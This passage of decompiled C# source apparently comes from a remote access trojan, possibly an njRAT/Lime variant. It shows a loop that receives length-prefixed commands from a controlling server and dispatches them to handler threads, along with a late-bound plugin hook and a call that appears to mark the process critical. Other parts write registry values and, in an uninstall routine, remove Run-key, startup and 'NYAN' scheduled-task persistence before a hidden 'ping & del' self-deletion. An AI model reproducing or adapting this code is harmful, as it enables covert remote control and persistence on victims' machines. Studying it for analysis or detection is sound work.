        Core.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static void RC()
    {
      while (true)
      {
        Core.lastcap = "";
        if (Core.C != null)
        {
          long num1 = -1;
          int num2 = 0;
          try
          {
            while (true)
            {
              do
              {
                checked { ++num2; }
                if (num2 == 10)
                {
                  num2 = 0;
                  Thread.Sleep(1);
                }
                if (Core.Cn)
                {
                  if (Core.C.Available < 1)
                    Core.C.Client.Poll(-1, SelectMode.SelectRead);
                  do
                  {
                    if (Core.C.Available > 0)
                    {
                      if (num1 == -1L)
                      {
                        string str = "";
                        while (true)
                        {
                          int CharCode = Core.C.GetStream().ReadByte();
                          switch (CharCode)
                          {
                            case -1:
                              goto label_25;
                            case 0:
                              goto label_13;
                            default:
                              str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                              continue;
                          }
                        }
label_13:
                        num1 = Conversions.ToLong(str);
                        if (num1 == 0L)
                        {
                          Core.Send("");
                          num1 = -1L;
                        }
                      }
                      else
                        goto label_18;
                    }
                    else
                      goto label_23;
                  }
                  while (Core.C.Available > 0);
                  continue;
label_18:
                  Core.b = new byte[checked (Core.C.Available + 1 - 1 + 1)];
                  long num3 = checked (num1 - Core.MeM.Length);
                  if ((long) Core.b.Length > num3)
                    Core.b = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                  int count = Core.C.Client.Receive(Core.b, 0, Core.b.Length, SocketFlags.None);
                  Core.MeM.Write(Core.b, 0, count);
                }
                else
                  goto label_25;
              }
              while (Core.MeM.Length != num1);
              num1 = -1L;
              Thread thread = new Thread((ParameterizedThreadStart) (a0 => Core.Ind((byte[]) a0)), 1);
              thread.Start((object) Core.MeM.ToArray());
              thread.Join(100);
              Core.MeM.Dispose();
              Core.MeM = new MemoryStream();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
label_23:;
        }
label_25:
        do
        {
          try
          {
            if (Core.PLG != null)
            {
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Core.PLG), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              Core.PLG = (object) null;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          Core.Cn = false;
        }
        while (!Core.connect());
        Core.Cn = true;
      }
    }

    public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);

    public static bool Send(string S) => Core.Sendb(Core.SB(ref S));

    public static bool Sendb(byte[] b)
    {
      if (!Core.Cn)
        return false;
      try
      {
        lock ((object) Core.LO)
        {
          if (!Core.Cn)
            return false;
          MemoryStream memoryStream = new MemoryStream();
          string S = b.Length.ToString() + "\0";
          byte[] buffer = Core.SB(ref S);
          memoryStream.Write(buffer, 0, buffer.Length);
          memoryStream.Write(b, 0, b.Length);
          Core.C.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        ProjectData.SetProjectError(ex1);
        try
        {
          if (Core.Cn)
          {
            Core.Cn = false;
            Core.C.Close();
          }
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return Core.Cn;
    }

    public static bool STV(string n, object t, RegistryValueKind typ)
    {
      bool flag;
      try
      {
        Core.F.Registry.CurrentUser.CreateSubKey("Software\\" + Core.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t)), typ);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void UNS()
    {
      string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
      string[] logicalDrives = Directory.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        string str = logicalDrives[index];
        try
        {
          if (System.IO.File.Exists(str + Core.RG))
            System.IO.File.Delete(str + Core.RG);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      Core.pr(0);
      Core.Isu = false;
      try
      {
        Core.F.Registry.CurrentUser.OpenSubKey(Core.sf, true).DeleteValue(Core.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Core.F.Registry.LocalMachine.OpenSubKey(Core.sf, true).DeleteValue(Core.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("schtasks /Delete /tn NYAN /F", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Core.HIDE_ME)
          System.IO.File.SetAttributes(Interaction.Environ(Core.DR) + "\\" + Core.EXE, FileAttributes.Normal);
        System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Core.RG);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Core.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(Core.RG, false);
        Interaction.DeleteSetting("Lime");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + Core.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

    public static byte[] ZIP(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer, 0, 4);
      int int32 = BitConverter.ToInt32(buffer, 0);
      memoryStream.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
      gzipStream.Read(array, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return array;
    }
  }
}
